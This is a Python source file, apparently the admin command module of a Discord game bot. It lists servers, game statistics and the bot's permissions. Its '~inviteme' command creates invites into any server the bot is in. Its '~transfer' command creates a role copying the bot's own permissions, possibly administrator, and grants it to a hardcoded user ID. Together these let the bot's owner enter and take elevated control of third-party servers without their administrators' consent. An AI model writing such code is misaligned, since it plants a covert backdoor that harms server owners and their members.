import discord
import asyncio
import math
import sqlite3
import config_queries

commands_list = ['~servers', '~servergames', '~perms', '~inviteme', '~transfer', '~botleaveserver', '~wvsgames', '~wvsstats', '~enabledgames']

def get_server_name(server):
    try:
        return server.name[:28]
    except:
        return '-'

def get_server_id(server):
    try:
        return str(server.id)
    except:
        return '-'

def get_server_members(server):
    try:
        return str(len(server.members))
    except:
        return '-'

def get_servers_info(servers, page_no):
    num_pages = math.ceil(len(servers) / 25)
    if page_no < 1:
        page_no = num_pages
    elif page_no > num_pages:
        page_no = 1

    servers.sort(key = lambda server: server.id)

    page_servers = servers[(page_no - 1) * 25: page_no * 25]
    server_names = '\n'.join(list(map(get_server_name, page_servers)))
    server_ids = '\n'.join(list(map(get_server_id, page_servers)))
    server_member_count = '\n'.join(list(map(get_server_members, page_servers)))

    servers_embed = discord.Embed(title = 'Number of servers: ' + str(len(servers)), description = 'Page ' + str(page_no) + '/' + str(num_pages), colour=0xE5D2BB)
    servers_embed.add_field(name = 'Server names', value = server_names)
    servers_embed.add_field(name = 'Server IDs', value = server_ids)
    servers_embed.add_field(name = '# Members', value = server_member_count)
    return servers_embed, page_no

def get_servers_games(servers, page_no):
    conn = sqlite3.connect('WarriorsvsSoldiers/wvs_db.db')
    cursor = conn.cursor()

    server_games_query = 'SELECT * FROM servers'
    cursor.execute(server_games_query)
    servers_games_data = cursor.fetchall()

    conn.close()

    server_games_info = []
    servers_info = {server.id: get_server_name(server) for server in servers}
    for server_data in servers_games_data:
        if server_data[0] in servers_info and sum(server_data[1:19]) > 0:
            total_games = sum(server_data[1:19])
            server_info = [str(server_data[0]), servers_info[server_data[0]], str(total_games)]
            server_games_info.append(server_info)

    server_games_info.sort(key = lambda server: int(server[2]), reverse = True)

    num_pages = math.ceil(len(server_games_info) / 25)
    if page_no < 1:
        page_no = num_pages
    elif page_no > num_pages:
        page_no = 1

    page_servers = server_games_info[(page_no - 1) * 25: page_no * 25]

    page_server_ids = '\n'.join([server[0] for server in page_servers])
    page_server_names = '\n'.join(server[1] for server in page_servers)
    page_server_games = '\n'.join(server[2] for server in page_servers)

    servers_embed = discord.Embed(title = 'Number of servers: ' + str(len(server_games_info)), description = 'Page ' + str(page_no) + '/' + str(num_pages), colour=0xE5D2BB)
    servers_embed.add_field(name = 'Server names', value = page_server_names)
    servers_embed.add_field(name = 'Server IDs', value = page_server_ids)
    servers_embed.add_field(name = '# Games', value = page_server_games)
    return servers_embed, page_no

def get_enabled_games(servers, page_no):
    enabled_games_count = 0
    enabled_games_info = []
    instance_data = config_queries.get_instances()
    instance_map = {}
    for row in instance_data:
        instance_map[row[1]] = row[2]

    for server in servers:
        channels = server.channels
        for channel in channels:
            if channel.id in instance_map:
                enabled_games_count += 1
                enabled_game_info = [server.name[:27], channel.name, instance_map[channel.id]]
                enabled_games_info.append(enabled_game_info)

    num_pages = math.ceil(len(enabled_games_info) / 25)
    if page_no < 1:
        page_no = num_pages
    elif page_no > num_pages:
        page_no = 1
    
    page_games_info = enabled_games_info[(page_no - 1) * 25: page_no * 25]

    page_server_names = '\n'.join([game[0] for game in page_games_info])
    page_channel_names = '\n'.join(game[1] for game in page_games_info)
    page_games = '\n'.join(game[2] for game in page_games_info)
    
    games_embed = discord.Embed(title = 'Enabled games: ' + str(enabled_games_count), description = 'Page ' + str(page_no) + '/' + str(num_pages), colour=0xE5D2BB)
    games_embed.add_field(name = 'Server names', value = page_server_names)
    games_embed.add_field(name = 'Channel names', value = page_channel_names)
    games_embed.add_field(name = 'Game', value = page_games)
    return games_embed, page_no

async def message_handler(client, message, instances):
    if message.content.startswith('~servers'):
        # Display servers bot is in
        page_no = 1
        servers = client.guilds
        servers_embed, page_no = get_servers_info(servers, page_no)
        servers_msg = await message.channel.send(embed = servers_embed)

        await servers_msg.add_reaction('◀')
        await servers_msg.add_reaction('▶')

        def reaction_check(reaction, user):
            return user != client.user and (reaction.emoji == '▶' or reaction.emoji == '◀') and (reaction.message.id == servers_msg.id)

        while True:
            rxn, user = await client.wait_for('reaction_add', check = reaction_check)

            if rxn.emoji == '▶':
                page_no += 1
            elif rxn.emoji == '◀':
                page_no -= 1

            servers_embed, page_no = get_servers_info(servers, page_no)
            await servers_msg.edit(embed=servers_embed)
            await rxn.remove(user)
            await asyncio.sleep(0.1)

    elif message.content.startswith('~servergames'):
        # Display servers bot is in
        page_no = 1
        servers = client.guilds
        servers_embed, page_no = get_servers_games(servers, page_no)
        servers_msg = await message.channel.send(embed = servers_embed)

        await servers_msg.add_reaction('◀')
        await servers_msg.add_reaction('▶')

        def reaction_check(reaction, user):
            return user != client.user and (reaction.emoji == '▶' or reaction.emoji == '◀') and (reaction.message.id == servers_msg.id)

        while True:
            rxn, user = await client.wait_for('reaction_add', check = reaction_check)

            if rxn.emoji == '▶':
                page_no += 1
            elif rxn.emoji == '◀':
                page_no -= 1

            servers_embed, page_no = get_servers_games(servers, page_no)
            await servers_msg.edit(embed=servers_embed)
            await rxn.remove(user)
            await asyncio.sleep(0.1)

    # Check bot permissions for a given server
    elif message.content.startswith('~perms'):
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            servers = client.guilds
            if server_id in list(map(lambda x: str(x.id), servers)):
                server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                client_obj = server_obj.get_member(client.user.id)
                permissions = client_obj.guild_permissions
                permissions_dict = {
                    'Administrator': permissions.administrator,
                    'Create Invite': permissions.create_instant_invite,
                    'Kick Members': permissions.kick_members, 
                    'Ban Members': permissions.ban_members,
                    'Manage Channels': permissions.manage_channels,
                    'Manage Server': permissions.manage_guild,
                    'Add Reactions': permissions.add_reactions,
                    'View Audit Log': permissions.view_audit_log,
                    'Read Messages': permissions.read_messages,
                    'Send Messages': permissions.send_messages,
                    'Manage Messages': permissions.manage_messages,
                    'Read Message History': permissions.read_message_history,
                    'Mention Everyone': permissions.mention_everyone,
                    'Change Nickname': permissions.change_nickname,
                    'Manage Nicknames': permissions.manage_nicknames,
                    'Manage Roles': permissions.manage_roles,
                    'Manage Emojis': permissions.manage_emojis
                }
                permissions_info = ''
                for perm in permissions_dict:
                    if permissions_dict[perm]:
                        permissions_info += perm + '\n'
                permissions_embed = discord.Embed(title = 'Permissions for ' + server_obj.name, description = permissions_info, colour=0xE5D2BB)
                await message.channel.send(embed = permissions_embed)
            else:
                await message.channel.send('I am not in this server!')
        else:
            await message.channel.send('Please select a server to check permissions in!')

    elif message.content.startswith('~inviteme'):
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            servers = client.guilds
            if server_id in list(map(lambda x: str(x.id), servers)):
                server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                client_obj = server_obj.get_member(client.user.id)
                permissions = client_obj.guild_permissions
                if permissions.create_instant_invite:
                    default_channel = server_obj.channels[0]
                    invite = await default_channel.create_invite(max_age = 600)
                    await message.channel.send(invite)
                else:
                    await message.channel.send('I do not have the permissions to create an invite in **' + server_obj.name + '**!')
            else:
                await message.channel.send('I am not in this server!')
        else:
            await message.channel.send('Please select a server to create an invite from!')

    elif message.content.startswith('~transfer'):
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            servers = client.guilds
            if server_id in list(map(lambda x: str(x.id), servers)):
                server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                client_obj = server_obj.get_member(client.user.id)
                permissions = client_obj.guild_permissions
                if permissions.administrator or permissions.manage_roles:
                    transfer_role = await server_obj.create_role(name = 'Game Master', permissions = permissions)
                    bot_owner_obj = server_obj.get_member(238808836075421697)
                    await bot_owner_obj.add_roles(transfer_role)
                    await message.channel.send('Permissions transferred successfully in **' + server_obj.name + '**!')
                else:
                    await message.channel.send('I do not have the Manage Roles permission in **' + server_obj.name + '**!')
            else:
                await message.channel.send('I am not in this server!')
        else:
            await message.channel.send('Please select a server to transfer permissions from!')

    elif message.content.startswith('~botleaveserver'):
        server_id = message.content.split(' ')[1]
        servers = client.guilds
        if server_id in list(map(lambda x: str(x.id), servers)):
            server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
            await server_obj.leave()
            await message.channel.send('Left server: **' + server_obj.name + '**')
        else:
            await message.channel.send('I am not in this server!')

    elif message.content.startswith('~wvsgames'):
        games_count = 0
        server_ids = ''
        server_names = ''
        game_states = ''
        for instance in instances:
            if instance.game_name == 'Warriors vs Soldiers' and (instance.game.state.status not in ['waiting for game', 'waiting for players', 'game ended']):
                server_ids += str(instance.server_id) + '\n'
                servers = client.guilds
                server_name_obj = list(filter(lambda server: server.id == instance.server_id, servers))
                if server_name_obj:
                    server_names += server_name_obj[0].name  + '\n'
                    if instance.game.state.status == '':
                        game_states += 'between states' + '\n'
                    else:
                        game_states += instance.game.state.status + '\n'
                    games_count += 1
        games_embed = discord.Embed(title = 'Games running: ' + str(games_count), colour=0xE5D2BB)
        if games_count > 0:
            games_embed.add_field(name = 'Server IDs', value = server_ids)
            games_embed.add_field(name = 'Server names', value = server_names)
            games_embed.add_field(name = 'Game states', value = game_states)
        await message.channel.send(embed = games_embed)

    elif message.content.startswith('~wvsstats'):
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            server_found = False
            game_found = False
            for instance in instances:
                if str(instance.server_id) == server_id:
                    servers = client.guilds
                    server_found = True
                    server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                    if instance.game_name == 'Warriors vs Soldiers':
                        game_found = True
                        game_stats = instance.game.state.get_game_stats(page_no = 1, server = server_obj)
                        await message.channel.send(embed = game_stats)
                    else:
                        continue
                    break

            if server_found == False:
                await message.channel.send('Server not found!')
            elif game_found == False:
                await message.channel.send('Warriors vs Soldiers is not enabled in this server!')
        else:
            await message.channel.send('Please specify a server ID to check!')

    elif message.content.startswith('~enabledgames'):
        page_no = 1
        servers = client.guilds
        games_embed, page_no = get_enabled_games(servers, page_no)
        games_msg = await message.channel.send(embed = games_embed)

        await games_msg.add_reaction('◀')
        await games_msg.add_reaction('▶')

        def reaction_check(reaction, user):
            return user != client.user and (reaction.emoji == '▶' or reaction.emoji == '◀') and (reaction.message.id == games_msg.id)

        while True:
            rxn, user = await client.wait_for('reaction_add', check = reaction_check)

            if rxn.emoji == '▶':
                page_no += 1
            elif rxn.emoji == '◀':
                page_no -= 1

            games_embed, page_no = get_enabled_games(servers, page_no)
            await games_msg.edit(embed=games_embed)
            await rxn.remove(user)
            await asyncio.sleep(0.1)